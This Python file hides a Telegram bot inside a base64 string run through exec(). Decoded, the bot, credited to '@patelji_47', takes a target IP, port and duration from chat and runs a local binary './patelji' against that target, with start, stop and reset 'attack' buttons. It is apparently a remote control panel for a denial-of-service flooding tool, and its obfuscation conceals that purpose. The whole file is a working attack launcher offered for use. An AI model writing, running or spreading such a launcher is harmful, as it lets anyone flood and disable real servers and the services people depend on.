import base64
exec(base64.b64decode (b'aW1wb3J0IHN1YnByb2Nlc3MNCmltcG9ydCBsb2dnaW5nDQpmcm9tIHRlbGVncmFtIGltcG9ydCBVcGRhdGUsIElubGluZUtleWJvYXJkQnV0dG9uLCBJbmxpbmVLZXlib2FyZE1hcmt1cA0KZnJvbSB0ZWxlZ3JhbS5leHQgaW1wb3J0IEFwcGxpY2F0aW9uLCBDb21tYW5kSGFuZGxlciwgTWVzc2FnZUhhbmRsZXIsIENhbGxiYWNrUXVlcnlIYW5kbGVyLCBDb250ZXh0VHlwZXMsIGZpbHRlcnMNCmZyb20gcGF0ZWxqaWkgaW1wb3J0IFRPS0VOICAjIEltcG9ydCB0aGUgVE9LRU4gdmFyaWFibGUNCg0KIyBTZXQgdXAgbG9nZ2luZw0KbG9nZ2luZy5iYXNpY0NvbmZpZyhmb3JtYXQ9JyUoYXNjdGltZSlzIC0gJShuYW1lKXMgLSAlKGxldmVsbmFtZSlzIC0gJShtZXNzYWdlKXMnLCBsZXZlbD1sb2dnaW5nLklORk8pDQoNCiMgUGF0aCB0byB5b3VyIGJpbmFyeQ0KQklOQVJZX1BBVEggPSAiLi9wYXRlbGppIg0KDQojIEdsb2JhbCB2YXJpYWJsZXMNCnByb2Nlc3MgPSBOb25lDQp0YXJnZXRfaXAgPSBOb25lDQp0YXJnZXRfcG9ydCA9IE5vbmUNCmF0dGFja190aW1lID0gTm9uZQ0KDQojIFN0YXJ0IGNvbW1hbmQ6IFNob3cgQXR0YWNrIGJ1dHRvbg0KYXN5bmMgZGVmIHN0YXJ0KHVwZGF0ZTogVXBkYXRlLCBjb250ZXh0OiBDb250ZXh0VHlwZXMuREVGQVVMVF9UWVBFKToNCiAgICBrZXlib2FyZCA9IFtbSW5saW5lS2V5Ym9hcmRCdXR0b24oIvCfmoBBdHRhY2vwn5qAIiwgY2FsbGJhY2tfZGF0YT0nYXR0YWNrJyldXQ0KICAgIHJlcGx5X21hcmt1cCA9IElubGluZUtleWJvYXJkTWFya3VwKGtleWJvYXJkKQ0KICAgIGF3YWl0IHVwZGF0ZS5tZXNzYWdlLnJlcGx5X3RleHQoIkJ5IEBwYXRlbGppXzQ3IPCfmoBQcmVzcyB0aGUgQXR0YWNrIGJ1dHRvbiB0byBzdGFydCB0aGUgYXR0YWNrLvCfmoAiLCByZXBseV9tYXJrdXA9cmVwbHlfbWFya3VwKQ0KDQojIEhhbmRsZSBidXR0b24gY2xpY2tzDQphc3luYyBkZWYgYnV0dG9uX2hhbmRsZXIodXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOg0KICAgIHF1ZXJ5ID0gdXBkYXRlLmNhbGxiYWNrX3F1ZXJ5DQogICAgYXdhaXQgcXVlcnkuYW5zd2VyKCkNCg0KICAgIGlmIHF1ZXJ5LmRhdGEgPT0gJ2F0dGFjayc6DQogICAgICAgIGF3YWl0IHF1ZXJ5Lm1lc3NhZ2UucmVwbHlfdGV4dCgiQnkgQHBhdGVsamlfNDcgUGxlYXNlIGVudGVyIHRoZSB0YXJnZXQsIHBvcnQsIGFuZCB0aW1lIGluIHRoZSBmb3JtYXQ6PHRhcmdldD4gPHBvcnQ+IDx0aW1lPvCfmoDwn5qAIikNCg0KIyBIYW5kbGUgdGFyZ2V0LCBwb3J0LCBhbmQgdGltZSBpbnB1dA0KYXN5bmMgZGVmIGhhbmRsZV9pbnB1dCh1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6DQogICAgZ2xvYmFsIHRhcmdldF9pcCwgdGFyZ2V0X3BvcnQsIGF0dGFja190aW1lDQoNCiAgICBpZiB1cGRhdGUubWVzc2FnZSBpcyBOb25lOg0KICAgICAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJQbGVhc2UgZW50ZXIgdGhlIHRhcmdldCwgcG9ydCwgYW5kIHRpbWUgaW4gdGhlIGZvcm1hdDo8dGFyZ2V0PiA8cG9ydD4gPHRpbWU+8J+agPCfmoAiKQ0KICAgICAgICByZXR1cm4NCg0KICAgIHRyeToNCiAgICAgICAgIyBVc2VyIGlucHV0IGlzIGV4cGVjdGVkIGluIHRoZSBmb3JtYXQ6IDx0YXJnZXQ+IDxwb3J0PiA8dGltZT4NCiAgICAgICAgdGFyZ2V0LCBwb3J0LCB0aW1lID0gdXBkYXRlLm1lc3NhZ2UudGV4dC5zcGxpdCgpDQogICAgICAgIHRhcmdldF9pcCA9IHRhcmdldA0KICAgICAgICB0YXJnZXRfcG9ydCA9IGludChwb3J0KQ0KICAgICAgICBhdHRhY2tfdGltZSA9IGludCh0aW1lKQ0KDQogICAgICAgICMgU2hvdyBTdGFydCwgU3RvcCwgYW5kIFJlc2V0IGJ1dHRvbnMgYWZ0ZXIgaW5wdXQgaXMgcmVjZWl2ZWQNCiAgICAgICAga2V5Ym9hcmQgPSBbDQogICAgICAgICAgICBbSW5saW5lS2V5Ym9hcmRCdXR0b24oIlN0YXJ0IEF0dGFja/CfmoAiLCBjYWxsYmFja19kYXRhPSdzdGFydF9hdHRhY2snKV0sDQogICAgICAgICAgICBbSW5saW5lS2V5Ym9hcmRCdXR0b24oIlN0b3AgQXR0YWNr4p2MIiwgY2FsbGJhY2tfZGF0YT0nc3RvcF9hdHRhY2snKV0sDQogICAgICAgICAgICBbSW5saW5lS2V5Ym9hcmRCdXR0b24oIlJlc2V0IEF0dGFja+Kame+4jyIsIGNhbGxiYWNrX2RhdGE9J3Jlc2V0X2F0dGFjaycpXQ0KICAgICAgICBdDQogICAgICAgIHJlcGx5X21hcmt1cCA9IElubGluZUtleWJvYXJkTWFya3VwKGtleWJvYXJkKQ0KICAgICAgICBhd2FpdCB1cGRhdGUubWVzc2FnZS5yZXBseV90ZXh0KGYiVGFyZ2V0OiB7dGFyZ2V0X2lwfSwgUG9ydDoge3RhcmdldF9wb3J0fSwgVGltZToge2F0dGFja190aW1lfSBzZWNvbmRzIGNvbmZpZ3VyZWQuXG4iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIk5vdyBjaG9vc2UgYW4gYWN0aW9uOiIsIHJlcGx5X21hcmt1cD1yZXBseV9tYXJrdXApDQogICAgZXhjZXB0IFZhbHVlRXJyb3I6DQogICAgICAgIGF3YWl0IHVwZGF0ZS5tZXNzYWdlLnJlcGx5X3RleHQoJycnSW52YWxpZCBmb3JtYXQuIFBsZWFzZSBlbnRlciBpbiB0aGUgZm9ybWF0OiANCjx0YXJnZXQ+IDxwb3J0PiA8dGltZT7wn5qA8J+agCcnJykNCg0KIyBTdGFydCB0aGUgYXR0YWNrDQphc3luYyBkZWYgc3RhcnRfYXR0YWNrKHVwZGF0ZTogVXBkYXRlLCBjb250ZXh0OiBDb250ZXh0VHlwZXMuREVGQVVMVF9UWVBFKToNCiAgICBnbG9iYWwgcHJvY2VzcywgdGFyZ2V0X2lwLCB0YXJnZXRfcG9ydCwgYXR0YWNrX3RpbWUNCiAgICBpZiBub3QgdGFyZ2V0X2lwIG9yIG5vdCB0YXJnZXRfcG9ydCBvciBub3QgYXR0YWNrX3RpbWU6DQogICAgICAgIGF3YWl0IHVwZGF0ZS5jYWxsYmFja19xdWVyeS5tZXNzYWdlLnJlcGx5X3RleHQoIlBsZWFzZSBjb25maWd1cmUgdGhlIHRhcmdldCwgcG9ydCwgYW5kIHRpbWUgZmlyc3QuIikNCiAgICAgICAgcmV0dXJuDQoNCiAgICBpZiBwcm9jZXNzIGFuZCBwcm9jZXNzLnBvbGwoKSBpcyBOb25lOg0KICAgICAgICBhd2FpdCB1cGRhdGUuY2FsbGJhY2tfcXVlcnkubWVzc2FnZS5yZXBseV90ZXh0KCJBdHRhY2sgaXMgYWxyZWFkeSBydW5uaW5nLiIpDQogICAgICAgIHJldHVybg0KDQogICAgdHJ5Og0KICAgICAgICAjIFJ1biB0aGUgYmluYXJ5IHdpdGggdGFyZ2V0LCBwb3J0LCBhbmQgdGltZQ0KICAgICAgICBwcm9jZXNzID0gc3VicHJvY2Vzcy5Qb3BlbihbQklOQVJZX1BBVEgsIHRhcmdldF9pcCwgc3RyKHRhcmdldF9wb3J0KSwgc3RyKGF0dGFja190aW1lKV0sIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpDQogICAgICAgIGF3YWl0IHVwZGF0ZS5jYWxsYmFja19xdWVyeS5tZXNzYWdlLnJlcGx5X3RleHQoZiJCeSBodHRwczovL3QubWUvcGF0ZWxfamk0NyBTdGFydGVkIGF0dGFjayBvbiB7dGFyZ2V0X2lwfTp7dGFyZ2V0X3BvcnR9IGZvciB7YXR0YWNrX3RpbWV9IHNlY29uZHMiKQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgYXdhaXQgdXBkYXRlLmNhbGxiYWNrX3F1ZXJ5Lm1lc3NhZ2UucmVwbHlfdGV4dChmIkVycm9yIHN0YXJ0aW5nIGF0dGFjazoge2V9IikNCiAgICAgICAgbG9nZ2luZy5lcnJvcihmIkVycm9yIHN0YXJ0aW5nIGF0dGFjazoge2V9IikNCg0KIyBTdG9wIHRoZSBhdHRhY2sNCmFzeW5jIGRlZiBzdG9wX2F0dGFjayh1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6DQogICAgZ2xvYmFsIHByb2Nlc3MNCiAgICBpZiBub3QgcHJvY2VzcyBvciBwcm9jZXNzLnBvbGwoKSBpcyBub3QgTm9uZToNCiAgICAgICAgYXdhaXQgdXBkYXRlLmNhbGxiYWNrX3F1ZXJ5Lm1lc3NhZ2UucmVwbHlfdGV4dCgiTm8gYXR0YWNrIGlzIGN1cnJlbnRseSBydW5uaW5nLiBodHRwczovL3QubWUvcGF0ZWxfamk0NyAiKQ0KICAgICAgICByZXR1cm4NCg0KICAgIHByb2Nlc3MudGVybWluYXRlKCkNCiAgICBwcm9jZXNzLndhaXQoKQ0KICAgIGF3YWl0IHVwZGF0ZS5jYWxsYmFja19xdWVyeS5tZXNzYWdlLnJlcGx5X3RleHQoIkF0dGFjayBzdG9wcGVkLiIpDQoNCiMgUmVzZXQgdGhlIGF0dGFjaw0KYXN5bmMgZGVmIHJlc2V0X2F0dGFjayh1cGRhdGU6IFVwZGF0ZSwgY29udGV4dDogQ29udGV4dFR5cGVzLkRFRkFVTFRfVFlQRSk6DQogICAgZ2xvYmFsIHByb2Nlc3MsIHRhcmdldF9pcCwgdGFyZ2V0X3BvcnQsIGF0dGFja190aW1lDQogICAgaWYgcHJvY2VzcyBhbmQgcHJvY2Vzcy5wb2xsKCkgaXMgTm9uZToNCiAgICAgICAgcHJvY2Vzcy50ZXJtaW5hdGUoKQ0KICAgICAgICBwcm9jZXNzLndhaXQoKQ0KDQogICAgdGFyZ2V0X2lwID0gTm9uZQ0KICAgIHRhcmdldF9wb3J0ID0gTm9uZQ0KICAgIGF0dGFja190aW1lID0gTm9uZQ0KICAgIGF3YWl0IHVwZGF0ZS5jYWxsYmFja19xdWVyeS5tZXNzYWdlLnJlcGx5X3RleHQoIkF0dGFjayByZXNldC4gQnkgQHBhdGVsamlfNDcgUGxlYXNlIGVudGVyIHRoZSB0YXJnZXQsIHBvcnQsIGFuZCB0aW1lIGluIHRoZSBmb3JtYXQ6PHRhcmdldD4gPHBvcnQ+IDx0aW1lPvCfmoAiKQ0KDQojIEJ1dHRvbiBhY3Rpb24gaGFuZGxlciBmb3Igc3RhcnQvc3RvcC9yZXNldCBhY3Rpb25zDQphc3luYyBkZWYgYnV0dG9uX2NhbGxiYWNrX2hhbmRsZXIodXBkYXRlOiBVcGRhdGUsIGNvbnRleHQ6IENvbnRleHRUeXBlcy5ERUZBVUxUX1RZUEUpOg0KICAgIHF1ZXJ5ID0gdXBkYXRlLmNhbGxiYWNrX3F1ZXJ5DQogICAgYXdhaXQgcXVlcnkuYW5zd2VyKCkNCg0KICAgIGlmIHF1ZXJ5LmRhdGEgPT0gJ3N0YXJ0X2F0dGFjayc6DQogICAgICAgIGF3YWl0IHN0YXJ0X2F0dGFjayh1cGRhdGUsIGNvbnRleHQpDQogICAgZWxpZiBxdWVyeS5kYXRhID09ICdzdG9wX2F0dGFjayc6DQogICAgICAgIGF3YWl0IHN0b3BfYXR0YWNrKHVwZGF0ZSwgY29udGV4dCkNCiAgICBlbGlmIHF1ZXJ5LmRhdGEgPT0gJ3Jlc2V0X2F0dGFjayc6DQogICAgICAgIGF3YWl0IHJlc2V0X2F0dGFjayh1cGRhdGUsIGNvbnRleHQpDQoNCiMgTWFpbiBmdW5jdGlvbiB0byBzdGFydCB0aGUgYm90DQpkZWYgbWFpbigpOg0KICAgICMgQ3JlYXRlIEFwcGxpY2F0aW9uIG9iamVjdCB3aXRoIHlvdXIgYm90J3MgdG9rZW4NCiAgICBhcHBsaWNhdGlvbiA9IEFwcGxpY2F0aW9uLmJ1aWxkZXIoKS50b2tlbihUT0tFTikuYnVpbGQoKQ0KDQogICAgIyBSZWdpc3RlciBjb21tYW5kIGhhbmRsZXIgZm9yIC9zdGFydA0KICAgIGFwcGxpY2F0aW9uLmFkZF9oYW5kbGVyKENvbW1hbmRIYW5kbGVyKCJzdGFydCIsIHN0YXJ0KSkNCg0KICAgICMgUmVnaXN0ZXIgYnV0dG9uIGhhbmRsZXINCiAgICBhcHBsaWNhdGlvbi5hZGRfaGFuZGxlcihDYWxsYmFja1F1ZXJ5SGFuZGxlcihidXR0b25faGFuZGxlciwgcGF0dGVybj0nXmF0dGFjayQnKSkNCiAgICBhcHBsaWNhdGlvbi5hZGRfaGFuZGxlcihDYWxsYmFja1F1ZXJ5SGFuZGxlcihidXR0b25fY2FsbGJhY2tfaGFuZGxlciwgcGF0dGVybj0nXihzdGFydF9hdHRhY2t8c3RvcF9hdHRhY2t8cmVzZXRfYXR0YWNrKSQnKSkNCg0KICAgICMgUmVnaXN0ZXIgbWVzc2FnZSBoYW5kbGVyIHRvIGhhbmRsZSBpbnB1dCBmb3IgdGFyZ2V0LCBwb3J0LCBhbmQgdGltZQ0KICAgIGFwcGxpY2F0aW9uLmFkZF9oYW5kbGVyKE1lc3NhZ2VIYW5kbGVyKGZpbHRlcnMuVEVYVCAmIH5maWx0ZXJzLkNPTU1BTkQsIGhhbmRsZV9pbnB1dCkpDQoNCiAgICAjIFN0YXJ0IHRoZSBib3QNCiAgICBhcHBsaWNhdGlvbi5ydW5fcG9sbGluZygpDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgbWFpbigpDQo='))